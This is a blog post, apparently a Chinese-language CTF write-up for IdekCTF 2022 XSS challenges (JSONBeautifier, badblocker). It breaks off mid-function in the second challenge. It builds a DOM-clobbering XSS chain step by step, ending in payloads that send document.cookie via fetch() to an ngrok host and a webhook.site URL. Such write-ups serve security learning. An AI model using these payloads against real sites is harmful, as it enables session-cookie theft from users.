<!doctype html>
<html lang="en-us"><head>
    <title>an4er&#39; blog</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="" />

    
    
    
    <link rel="stylesheet" href="../../css/theme.min.css">

    
    
    
    <link rel="shortcut icon" href="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/avatar.jpg" />
    
</head>
<body>
        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
    <div class="row">
        
        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
            <a href="../../" class="text-decoration-none">
                <img id="home-image" class="rounded-circle" src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/avatar.jpg"/>
            </a>
        </div>
        <div class="col-sm-8 col-12 text-sm-left text-center">
        
            <h2 class="m-0 mb-2 mt-4">
                <a href="../../" class="text-decoration-none">
                    
                        an4er
                    
                </a>
            </h2>
            <p class="text-muted mb-1">
                
                    Want to be a Ctfer, Developer, Red Team
                
            </p>
            <ul id="nav-links" class="list-inline mb-2">
                
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../about/" title="About">About</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../post/" title="Posts">Posts</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../categories/" title="Categories">Categories</a>
                    </li>
                
            </ul>
            <ul id="nav-social" class="list-inline">
                
                    <li class="list-inline-item mr-3">
                        <a href="https://github.com/an5er" target="_blank">
                            <i class="fab fa-github fa-1x text-muted"></i>
                        </a>
                    </li>
                
            </ul>
        </div>
    </div>
    <hr />
</header>
<div class="container">
    <div class="pl-sm-2">
        <div class="mb-3">
            <h3 class="mb-0">IdekCTF 2022 XSS</h3>
            
            <small class="text-muted">Published January 25, 2023</small>
        </div>

        <article>
            <h2 id="jsonbeautifier">JSONBeautifier</h2>
<p>从<a href="https://www.zeyu2001.com/">@zeyu2001</a>师傅的<code>payload</code>学习赛中卡住的相关基础知识后自己尝试复现</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>{<span style="color:#e6db74">&#34;x&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;&lt;/pre&gt;&lt;iframe name=&#39;fetch(&amp;quot;http://0.tcp.ngrok.io:15336?cookie=&amp;quot;+document.cookie)&#39; srcdoc=&#39;&lt;iframe name=config srcdoc=&amp;#039;&lt;head&gt;&lt;title id=debug&gt;test&lt;/title&gt;&lt;/head&gt;&lt;frameset id=opts cols=x:eval(/*, */name)//&gt;&lt;/frameset&gt;&amp;#039;&gt;&lt;/iframe&gt;&lt;div id=json-input&gt;{&amp;quot;x&amp;quot;:&amp;quot*/name)//&amp;quot}&lt;/div&gt;&lt;script src=static/js/main.js&gt;&lt;/script&gt;&#39;&gt;&lt;/iframe&gt;&#34;</span>}
</span></span></code></pre></div><p>源码不多，简单看一下源码，一个<code>flask</code>应用为服务添加<code>CSP</code>：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">headers</span>[<span style="color:#e6db74">&#39;Content-Security-Policy&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;script-src &#39;unsafe-eval&#39; &#39;self&#39;; object-src &#39;none&#39;;&#34;</span>
</span></span></code></pre></div><p>这允许我们使用同源的<code>JS</code>文件和<code>eval</code>函数，然后有个<code>main.js</code>文件，关键代码如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">userJson</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">inputBox</span>.<span style="color:#a6e22e">textContent</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cols</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">config</span><span style="color:#f92672">?</span>.<span style="color:#a6e22e">opts</span><span style="color:#f92672">?</span>.<span style="color:#a6e22e">cols</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">defaults</span>.<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">cols</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">output</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">userJson</span>, <span style="color:#66d9ef">null</span>, <span style="color:#a6e22e">cols</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">config</span><span style="color:#f92672">?</span>.<span style="color:#a6e22e">debug</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">defaults</span>.<span style="color:#a6e22e">debug</span>){
</span></span><span style="display:flex;"><span>		eval(<span style="color:#e6db74">`beautified = </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">output</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">beautified</span>;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">outputBox</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`&lt;pre&gt;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">output</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/pre&gt;`</span>
</span></span></code></pre></div><p>因为我们的最终目的是<code>XSS</code>，所以我们需要进入<code>eval</code>函数，也就是需要给<code>this.config.debug</code>赋值，而且下面<code>outputBox.innerHTML</code>的赋值中的<code>output</code>可控，<code>JSON.stringify</code>的第三个参数可控的话可以导致逃逸出字符串</p>
<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301201858635.png" alt="image-20230120185847518"></p>
<p>我们可以将<code>&lt;pre&gt;</code>标签闭合，然后就可以插入任意<code>html</code>，比赛的时候没想到<code>DOM clobbering</code>，赛后学习一下</p>
<p><a href="https://portswigger.net/research/dom-clobbering-strikes-back">https://portswigger.net/research/dom-clobbering-strikes-back</a></p>
<p><a href="https://portswigger.net/web-security/dom-based/dom-clobbering">https://portswigger.net/web-security/dom-based/dom-clobbering</a></p>
<p>在文中提到超过三层的时候可以使用</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">a</span> <span style="color:#a6e22e">srcdoc</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;iframe srcdoc=&#39;&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;&#39; name=b&gt;&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">setTimeout</span>(()=&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">d</span>),<span style="color:#ae81ff">500</span>)&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><p>因为我们只需要三层，所以我尝试简单改造一下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">a</span> <span style="color:#a6e22e">srcdoc</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;iframe srcdoc=&#39;&lt;a id=opts name=cols href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=opts&gt;&#39; name=config&gt;&lt;/iframe&gt;&lt;script src=./test.js&gt;&lt;/script&gt;&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
</span></span></code></pre></div><p>test.js</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">config</span>.<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">cols</span>);
</span></span></code></pre></div><p>但是这个时候在源代码中<code>JSON.stringify</code>传入的<code>cols</code>没有被当成一个字符串，触发<code>toString</code>方法，传入的是一个<code>object</code>标签对象，所以我们需要找一个带有<code>cols</code>属性<code>html</code>标签，写个<code>js</code>找下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">html</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;a&#34;</span>,<span style="color:#e6db74">&#34;abbr&#34;</span>,<span style="color:#e6db74">&#34;acronym&#34;</span>,<span style="color:#e6db74">&#34;address&#34;</span>,<span style="color:#e6db74">&#34;applet&#34;</span>,<span style="color:#e6db74">&#34;area&#34;</span>,<span style="color:#e6db74">&#34;article&#34;</span>,<span style="color:#e6db74">&#34;aside&#34;</span>,<span style="color:#e6db74">&#34;audio&#34;</span>,<span style="color:#e6db74">&#34;b&#34;</span>,<span style="color:#e6db74">&#34;base&#34;</span>,<span style="color:#e6db74">&#34;basefont&#34;</span>,<span style="color:#e6db74">&#34;bdi&#34;</span>,<span style="color:#e6db74">&#34;bdo&#34;</span>,<span style="color:#e6db74">&#34;bgsound&#34;</span>,<span style="color:#e6db74">&#34;big&#34;</span>,<span style="color:#e6db74">&#34;blink&#34;</span>,<span style="color:#e6db74">&#34;blockquote&#34;</span>,<span style="color:#e6db74">&#34;body&#34;</span>,<span style="color:#e6db74">&#34;br&#34;</span>,<span style="color:#e6db74">&#34;button&#34;</span>,<span style="color:#e6db74">&#34;canvas&#34;</span>,<span style="color:#e6db74">&#34;caption&#34;</span>,<span style="color:#e6db74">&#34;center&#34;</span>,<span style="color:#e6db74">&#34;cite&#34;</span>,<span style="color:#e6db74">&#34;code&#34;</span>,<span style="color:#e6db74">&#34;col&#34;</span>,<span style="color:#e6db74">&#34;colgroup&#34;</span>,<span style="color:#e6db74">&#34;command&#34;</span>,<span style="color:#e6db74">&#34;content&#34;</span>,<span style="color:#e6db74">&#34;data&#34;</span>,<span style="color:#e6db74">&#34;datalist&#34;</span>,<span style="color:#e6db74">&#34;dd&#34;</span>,<span style="color:#e6db74">&#34;del&#34;</span>,<span style="color:#e6db74">&#34;details&#34;</span>,<span style="color:#e6db74">&#34;dfn&#34;</span>,<span style="color:#e6db74">&#34;dialog&#34;</span>,<span style="color:#e6db74">&#34;dir&#34;</span>,<span style="color:#e6db74">&#34;div&#34;</span>,<span style="color:#e6db74">&#34;dl&#34;</span>,<span style="color:#e6db74">&#34;dt&#34;</span>,<span style="color:#e6db74">&#34;element&#34;</span>,<span style="color:#e6db74">&#34;em&#34;</span>,<span style="color:#e6db74">&#34;embed&#34;</span>,<span style="color:#e6db74">&#34;fieldset&#34;</span>,<span style="color:#e6db74">&#34;figcaption&#34;</span>,<span style="color:#e6db74">&#34;figure&#34;</span>,<span style="color:#e6db74">&#34;font&#34;</span>,<span style="color:#e6db74">&#34;footer&#34;</span>,<span style="color:#e6db74">&#34;form&#34;</span>,<span style="color:#e6db74">&#34;frame&#34;</span>,<span style="color:#e6db74">&#34;frameset&#34;</span>,<span style="color:#e6db74">&#34;h1&#34;</span>,<span style="color:#e6db74">&#34;head&#34;</span>,<span style="color:#e6db74">&#34;header&#34;</span>,<span style="color:#e6db74">&#34;hgroup&#34;</span>,<span style="color:#e6db74">&#34;hr&#34;</span>,<span style="color:#e6db74">&#34;html&#34;</span>,<span style="color:#e6db74">&#34;i&#34;</span>,<span style="color:#e6db74">&#34;iframe&#34;</span>,<span style="color:#e6db74">&#34;image&#34;</span>,<span style="color:#e6db74">&#34;img&#34;</span>,<span style="color:#e6db74">&#34;input&#34;</span>,<span style="color:#e6db74">&#34;ins&#34;</span>,<span style="color:#e6db74">&#34;isindex&#34;</span>,<span style="color:#e6db74">&#34;kbd&#34;</span>,<span style="color:#e6db74">&#34;keygen&#34;</span>,<span style="color:#e6db74">&#34;label&#34;</span>,<span style="color:#e6db74">&#34;legend&#34;</span>,<span style="color:#e6db74">&#34;li&#34;</span>,<span style="color:#e6db74">&#34;link&#34;</span>,<span style="color:#e6db74">&#34;listing&#34;</span>,<span style="color:#e6db74">&#34;main&#34;</span>,<span style="color:#e6db74">&#34;map&#34;</span>,<span style="color:#e6db74">&#34;mark&#34;</span>,<span style="color:#e6db74">&#34;marquee&#34;</span>,<span style="color:#e6db74">&#34;menu&#34;</span>,<span style="color:#e6db74">&#34;menuitem&#34;</span>,<span style="color:#e6db74">&#34;meta&#34;</span>,<span style="color:#e6db74">&#34;meter&#34;</span>,<span style="color:#e6db74">&#34;multicol&#34;</span>,<span style="color:#e6db74">&#34;nav&#34;</span>,<span style="color:#e6db74">&#34;nextid&#34;</span>,<span style="color:#e6db74">&#34;nobr&#34;</span>,<span style="color:#e6db74">&#34;noembed&#34;</span>,<span style="color:#e6db74">&#34;noframes&#34;</span>,<span style="color:#e6db74">&#34;noscript&#34;</span>,<span style="color:#e6db74">&#34;object&#34;</span>,<span style="color:#e6db74">&#34;ol&#34;</span>,<span style="color:#e6db74">&#34;optgroup&#34;</span>,<span style="color:#e6db74">&#34;option&#34;</span>,<span style="color:#e6db74">&#34;output&#34;</span>,<span style="color:#e6db74">&#34;p&#34;</span>,<span style="color:#e6db74">&#34;param&#34;</span>,<span style="color:#e6db74">&#34;picture&#34;</span>,<span style="color:#e6db74">&#34;plaintext&#34;</span>,<span style="color:#e6db74">&#34;pre&#34;</span>,<span style="color:#e6db74">&#34;progress&#34;</span>,<span style="color:#e6db74">&#34;q&#34;</span>,<span style="color:#e6db74">&#34;rb&#34;</span>,<span style="color:#e6db74">&#34;rp&#34;</span>,<span style="color:#e6db74">&#34;rt&#34;</span>,<span style="color:#e6db74">&#34;rtc&#34;</span>,<span style="color:#e6db74">&#34;ruby&#34;</span>,<span style="color:#e6db74">&#34;s&#34;</span>,<span style="color:#e6db74">&#34;samp&#34;</span>,<span style="color:#e6db74">&#34;script&#34;</span>,<span style="color:#e6db74">&#34;section&#34;</span>,<span style="color:#e6db74">&#34;select&#34;</span>,<span style="color:#e6db74">&#34;shadow&#34;</span>,<span style="color:#e6db74">&#34;slot&#34;</span>,<span style="color:#e6db74">&#34;small&#34;</span>,<span style="color:#e6db74">&#34;source&#34;</span>,<span style="color:#e6db74">&#34;spacer&#34;</span>,<span style="color:#e6db74">&#34;span&#34;</span>,<span style="color:#e6db74">&#34;strike&#34;</span>,<span style="color:#e6db74">&#34;strong&#34;</span>,<span style="color:#e6db74">&#34;style&#34;</span>,<span style="color:#e6db74">&#34;sub&#34;</span>,<span style="color:#e6db74">&#34;summary&#34;</span>,<span style="color:#e6db74">&#34;sup&#34;</span>,<span style="color:#e6db74">&#34;svg&#34;</span>,<span style="color:#e6db74">&#34;table&#34;</span>,<span style="color:#e6db74">&#34;tbody&#34;</span>,<span style="color:#e6db74">&#34;td&#34;</span>,<span style="color:#e6db74">&#34;template&#34;</span>,<span style="color:#e6db74">&#34;textarea&#34;</span>,<span style="color:#e6db74">&#34;tfoot&#34;</span>,<span style="color:#e6db74">&#34;th&#34;</span>,<span style="color:#e6db74">&#34;thead&#34;</span>,<span style="color:#e6db74">&#34;time&#34;</span>,<span style="color:#e6db74">&#34;title&#34;</span>,<span style="color:#e6db74">&#34;tr&#34;</span>,<span style="color:#e6db74">&#34;track&#34;</span>,<span style="color:#e6db74">&#34;tt&#34;</span>,<span style="color:#e6db74">&#34;u&#34;</span>,<span style="color:#e6db74">&#34;ul&#34;</span>,<span style="color:#e6db74">&#34;var&#34;</span>,<span style="color:#e6db74">&#34;video&#34;</span>,<span style="color:#e6db74">&#34;wbr&#34;</span>,<span style="color:#e6db74">&#34;xmp&#34;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">props</span> <span style="color:#f92672">=</span> [];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#a6e22e">i</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">html</span>.<span style="color:#a6e22e">length</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">obj</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#a6e22e">html</span>[<span style="color:#a6e22e">i</span>]);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>(<span style="color:#a6e22e">prop</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">obj</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">prop</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;cols&#39;</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">props</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">html</span>[<span style="color:#a6e22e">i</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&gt;&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">prop</span>)
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">props</span>.<span style="color:#a6e22e">join</span>(<span style="color:#e6db74">&#39;\n&#39;</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
</span></span></code></pre></div><p>运行后得到</p>
<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301201909812.png" alt="image-20230120190904772"></p>
<p>看下<code>textarea</code>，尝试发现其<code>cols</code>设置为字符串时，获得的<code>cols</code>值是默认的20</p>
<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202311262054777.png" alt="image-20230120191004704"></p>
<p>尝试发现<code>&lt;frameset&gt;</code>可用</p>
<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202311262054756.png" alt="image-20230120191311950"></p>
<p>即构造</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">a</span> <span style="color:#a6e22e">srcdoc</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;iframe srcdoc=&#39;&lt;frameset id=opts cols=aaa&gt;&#39; name=config&gt;&lt;/iframe&gt;&lt;script src=./test.js&gt;&lt;/script&gt;&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
</span></span></code></pre></div><p>然后就是debug赋值，如果使用的标签和<code>&lt;frameset&gt;</code>同在body里面，那么只会出现其中一个</p>
<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301202006633.png" alt="image-20230120200600580"></p>
<p>所以使用<code>&lt;head&gt;</code>中的标签，这里用<code>title</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">srcdoc</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;iframe name=config srcdoc=&#39;&lt;title id=debug&gt;a&lt;/title&gt;&lt;frameset id=opts cols=aaa&gt;&lt;/frameset&gt;&#39;&gt;&lt;/iframe&gt;&lt;script src=./test.js&gt;&lt;/script&gt;&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
</span></span></code></pre></div><p>在iframe中引入mian.js，</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;&lt;/pre&gt;&#34;</span>:<span style="color:#e6db74">&#34;&lt;iframe srcdoc=&#39;&lt;iframe name=config srcdoc=&amp;quot;&lt;title id=debug&gt;a&lt;/title&gt;&lt;frameset id=opts cols=aaa&gt;&lt;/frameset&gt;&amp;quot;&gt;&lt;/iframe&gt;&lt;script src=static/js/main.js&gt;&lt;/script&gt;&#39;&gt;&lt;/iframe&gt;&#34;</span>}
</span></span></code></pre></div><p>然后内层也需要传入用户可控的json</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">json-input</span>&gt;{&amp;quot;x&amp;quot;:&amp;quot;x&amp;quot;}&lt;/<span style="color:#f92672">div</span>&gt;
</span></span></code></pre></div><p>合起来</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;&lt;/pre&gt;&#34;</span>:<span style="color:#e6db74">&#34;&lt;iframe srcdoc=&#39;&lt;iframe name=config srcdoc=&amp;quot;&lt;title id=debug&gt;a&lt;/title&gt;&lt;frameset id=opts cols=aaa&gt;&lt;/frameset&gt;&amp;quot;&gt;&lt;/iframe&gt;&lt;div id=json-input&gt;{&amp;quot;x&amp;quot;:&amp;quot;x&amp;quot;}&lt;/div&gt;&lt;script src=static/js/main.js&gt;&lt;/script&gt;&#39;&gt;&lt;/iframe&gt;&#34;</span>}
</span></span></code></pre></div><p>此时我们可控的<code>output</code>为</p>
<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301202023919.png" alt="image-20230120202348875"></p>
<p>此时的cols可想到用<code>a:eval(xx)//</code>来执行命令，因为在js中，我们传入的<code>output</code>始终会用<code>{}</code>，所以执行赋值的时候需要配上键值对</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>eval(<span style="color:#e6db74">`beautified = </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">output</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
</span></span></code></pre></div><p>但是</p>
<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301202027220.png" alt="image-20230120202700177"></p>
<p>JSON.stringify()接收的第三个参数限制10个字母长，好在json字符串也是我们可控的，可以使用注释<code>/**/</code>来拼接，也就是</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">a:eval(/*</span><span style="color:#f92672">&#34;x&#34;</span>:<span style="color:#e6db74">&#34;*/alert(111))//&#34;</span>
</span></span><span style="display:flex;"><span>} 
</span></span></code></pre></div><p>也就是</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;&lt;/pre&gt;&#34;</span>:<span style="color:#e6db74">&#34;&lt;iframe srcdoc=&#39;&lt;iframe name=config srcdoc=&amp;quot;&lt;title id=debug&gt;a&lt;/title&gt;&lt;frameset id=opts cols=a:eval(/*&gt;&lt;/frameset&gt;&amp;quot;&gt;&lt;/iframe&gt;&lt;div id=json-input&gt;{&amp;quot;x&amp;quot;:&amp;quot;*/alert(111))//&amp;quot;}&lt;/div&gt;&lt;script src=static/js/main.js&gt;&lt;/script&gt;&#39;&gt;&lt;/iframe&gt;&#34;</span>}
</span></span></code></pre></div><p>因为我们要获取cookie，用fetch即可</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;&lt;/pre&gt;&#34;</span>:<span style="color:#e6db74">&#34;&lt;iframe srcdoc=&#39;&lt;iframe name=config srcdoc=&amp;quot;&lt;title id=debug&gt;a&lt;/title&gt;&lt;frameset id=opts cols=a:eval(/*&gt;&lt;/frameset&gt;&amp;quot;&gt;&lt;/iframe&gt;&lt;div id=json-input&gt;{&amp;quot;x&amp;quot;:&amp;quot;*/fetch(&amp;#039;https://webhook.site/689e62cc-c516-4cec-a302-9bdc67202cc5?cookie=&amp;#039;+document.cookie))//&amp;quot;}&lt;/div&gt;&lt;script src=static/js/main.js&gt;&lt;/script&gt;&#39;&gt;&lt;/iframe&gt;&#34;</span>}
</span></span></code></pre></div><p>也可像在<a href="https://www.zeyu2001.com/">@zeyu2001</a>师傅中用<code>name</code>去取得外层的<code>name</code>的值，我的理解是<code>name</code>等同于<code>this.name</code>，在<code>&lt;iframe&gt;</code>中，this返回的是一个<code>windows</code>对象，this.name就返回窗口的名字，而<code>&lt;iframe&gt;</code>标签中的name属性就是设置窗口名称，所以可以在内层使用<code>name</code>变量来获得值。</p>
<h2 id="badblocker">badblocker</h2>
<p>从出题人<code>@IcesFont#1629</code>给的思路复现</p>
<p>题目提供了附件，起手先看一手<code>bot</code>，<code>flag</code>放在<code>localStorage</code>的<code>blockHistory</code>中，所以我们的最终目的是<code>XSS</code>，那么开找源码中有没有哪里的<code>DOM</code>可控，发现唯一的可控点在<code>utils.js</code>中的<code>showHistory</code>函数，看下关键代码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> [<span style="color:#a6e22e">date</span>, { <span style="color:#a6e22e">url</span>, <span style="color:#a6e22e">numBlocked</span> }] <span style="color:#66d9ef">of</span> Object.<span style="color:#a6e22e">entries</span>(<span style="color:#a6e22e">history</span>).<span style="color:#a6e22e">reverse</span>()) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">historyHTML</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">`&lt;p&gt;</span><span style="color:#e6db74">${</span><span style="color:#66d9ef">new</span> Date(<span style="color:#f92672">+</span><span style="color:#a6e22e">date</span>).<span style="color:#a6e22e">toDateString</span>()<span style="color:#e6db74">}</span><span style="color:#e6db74"> - &lt;code&gt;</span><span style="color:#e6db74">${</span>encodeURI(<span style="color:#a6e22e">url</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/code&gt;&lt;br&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;b&gt;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">numBlocked</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> ads blocked&lt;/b&gt;&lt;/p&gt;`</span>;
</span></span><span style="display:flex;"><span>        }
</span></span></code></pre></div><p>明显最终只有<code>numBlocked</code>有可能性，看看<code>numBlocked</code>在哪里被设置，找到在<code>viewer.html</code>中的<code>clearFrame()</code>：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">clearFrame</span>(<span style="color:#a6e22e">frame</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> Promise(<span style="color:#66d9ef">async</span> <span style="color:#a6e22e">resolve</span> =&gt; {
